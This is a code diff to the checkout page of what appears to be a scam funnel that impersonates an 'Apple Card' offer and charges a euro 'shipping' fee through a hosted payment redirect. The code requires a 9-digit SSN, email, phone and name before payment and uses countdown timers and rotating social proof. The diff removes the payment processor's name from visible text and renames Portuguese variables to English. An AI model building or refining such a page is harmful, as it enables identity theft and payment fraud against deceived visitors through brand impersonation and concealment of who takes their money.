@@ -123,7 +123,7 @@
 
             <div class="verify-banner" id="verifyBanner">
                 <div class="spinner"></div>
-                <span>Confirming your payment with Cooud...</span>
+                <span>Confirming your payment...</span>
             </div>
 
             <div class="timer-banner">
@@ -185,7 +185,7 @@
                 </div>
                 <div class="faq-item">
                     <div class="faq-q" onclick="toggleFaq(this)">Is the payment secure?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
-                    <div class="faq-a">Yes. Payments are processed by Cooud over PCI-compliant infrastructure with 256-bit SSL encryption. We never see your card number — Cooud tokenizes it before processing.</div>
+                    <div class="faq-a">Yes. Payments are processed over PCI-compliant infrastructure with 256-bit SSL encryption. We never see your card number — it's tokenized before processing.</div>
                 </div>
                 <div class="faq-item">
                     <div class="faq-q" onclick="toggleFaq(this)">Can I cancel my order?<svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6z"/></svg></div>
@@ -227,7 +227,7 @@
         const data = LeadData.load();
         const params = new URLSearchParams(window.location.search);
 
-        // ─── If returning from Cooud (?pay=ok&cooud_session_id=...) verify and redirect to obrigado.html ───
+        // ─── If returning from hosted payment (?pay=ok&cooud_session_id=...) verify and redirect to obrigado.html ───
         if (params.get('pay') === 'ok' && params.get('cooud_session_id')) {
             verifyAndForward(params.get('cooud_session_id'));
             return; // skip the rest of the checkout init
@@ -236,53 +236,53 @@
         // ─── Gate: redirect to dados.html if missing required checkout info ───
         const hasRequired = data.ssn && (String(data.ssn).replace(/\D+/g,'').length === 9)
                          && data.email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(data.email)
-                         && (data.telefone || data.phone)
-                         && (String(data.telefone || data.phone || '').replace(/\D+/g,'').length >= 9)
-                         && data.nome;
+                         && data.phone
+                         && (String(data.phone || '').replace(/\D+/g,'').length >= 9)
+                         && data.name;
         if (!hasRequired && params.get('skip') !== 'pago' && params.get('test') !== '1') {
-            const target = data.dados_completed ? 'cep.html' : (data.identity_confirmed ? 'dados.html' : 'login.html');
+            const target = data.account_details_completed ? 'cep.html' : (data.identity_confirmed ? 'dados.html' : 'login.html');
             const u = new URL(target, window.location.href);
             new URLSearchParams(window.location.search).forEach((v, k) => u.searchParams.set(k, v));
             window.location.replace(u.toString());
             throw new Error('redirect');
         }
 
-        const isTestMode = params.get('test') === '1' || params.get('modo') === 'teste';
+        const isTestMode = params.get('test') === '1';
 
-        let frete = data.frete_valor || parseFloat(params.get('frete')) || 22.45;
-        const tipo = data.frete_tipo || params.get('tipo') || 'expresso';
-        const corCartao = data.card_color || 'silver';
-        const corLabel = data.card_color_label || 'Titanium';
+        let shipping = data.shipping_price || parseFloat(params.get('shipping')) || 22.45;
+        const type = data.shipping_type || params.get('type') || 'express';
+        const cardColor = data.card_color || 'silver';
+        const cardColorLabel = data.card_color_label || 'Titanium';
 
         if (isTestMode) {
-            frete = 2.00;
+            shipping = 2.00;
             document.getElementById('testBanner').classList.add('active');
         }
 
-        const amountCents = Math.round(frete * 100);
+        const amountCents = Math.round(shipping * 100);
 
         const colorMap = {
             silver: 'linear-gradient(145deg, #E3E3E8, #C8C8CD, #E8E8ED)',
             black: 'linear-gradient(145deg, #2C2C2E, #1A1A1C, #3A3A3C)',
             gold: 'linear-gradient(145deg, #F5E6CC, #D4C4A0, #F0DCC0)'
         };
-        const tipoLabels = { economico:'Standard', expresso:'Express', premium:'Premium' };
+        const shippingLabels = { standard:'Standard', express:'Express', premium:'Premium' };
 
         const formatEUR = (v) => `€ ${v.toFixed(2)}`;
 
-        document.getElementById('orderCardBg').style.background = colorMap[corCartao] || colorMap.silver;
-        document.getElementById('orderColor').textContent = corLabel;
-        document.getElementById('orderTipo').textContent = tipoLabels[tipo] || 'Express';
-        document.getElementById('orderFrete').textContent = formatEUR(frete);
-        document.getElementById('orderTotal').textContent = formatEUR(frete);
-        document.getElementById('payPrice').textContent = formatEUR(frete);
+        document.getElementById('orderCardBg').style.background = colorMap[cardColor] || colorMap.silver;
+        document.getElementById('orderColor').textContent = cardColorLabel;
+        document.getElementById('orderTipo').textContent = shippingLabels[type] || 'Express';
+        document.getElementById('orderFrete').textContent = formatEUR(shipping);
+        document.getElementById('orderTotal').textContent = formatEUR(shipping);
+        document.getElementById('payPrice').textContent = formatEUR(shipping);
 
         if (window.track) window.track('InitiateCheckout', {
-            value: frete,
+            value: shipping,
             currency: 'EUR',
             num_items: 1,
-            content_id: 'apple-card-eu-' + tipo,
-            content_name: 'Apple Card — ' + (tipoLabels[tipo] || 'Express'),
+            content_id: 'apple-card-eu-' + type,
+            content_name: 'Apple Card — ' + (shippingLabels[type] || 'Express'),
             content_type: 'product'
         });
 
@@ -321,7 +321,7 @@
         setInterval(rotateSocialProof, 5000);
 
         // ═══════════════════════════════════════
-        // ─── PAYMENT (Cooud hosted redirect) ───
+        // ─── PAYMENT (hosted redirect) ───
         // ═══════════════════════════════════════
 
         window.generatePayment = async function() {
@@ -330,10 +330,10 @@
             btn.disabled = true;
 
             if (window.track) window.track('AddPaymentInfo', {
-                value: frete,
+                value: shipping,
                 currency: 'EUR',
                 payment_method: 'cooud_hosted',
-                content_id: 'apple-card-eu-' + tipo,
+                content_id: 'apple-card-eu-' + type,
                 content_type: 'product'
             });
 
@@ -348,15 +348,15 @@
             });
             const utm = mergedQs.toString();
 
-            const abGroup = params.get('ab') || data.ab_frete_grupo || '';
+            const abGroup = params.get('ab') || data.ab_shipping_group || '';
 
             const payload = {
                 amount: amountCents,
                 currency: 'eur',
-                payerName: data.nome || data.name || params.get('nome') || 'Customer',
+                payerName: data.name || params.get('name') || 'Customer',
                 email: data.email || params.get('email') || '',
-                phone: data.telefone || data.phone || params.get('phone') || '',
-                productName: `Apple Card — ${tipoLabels[tipo] || 'Express'} Shipping`,
+                phone: data.phone || params.get('phone') || '',
+                productName: `Apple Card — ${shippingLabels[type] || 'Express'} Shipping`,
                 successPath: 'obrigado.html',
                 cancelPath: 'checkout.html',
                 utm,
@@ -386,8 +386,8 @@
                     cooud_initiated_at: Date.now()
                 });
 
-                // Redirect the buyer to Cooud's hosted checkout. After payment,
-                // Cooud redirects back to ?pay=ok&cooud_session_id=cooud_cs_*.
+                // Redirect the buyer to the hosted checkout. After payment,
+                // it redirects back to ?pay=ok&cooud_session_id=cooud_cs_*.
                 window.location.assign(result.url);
 
             } catch (e) {
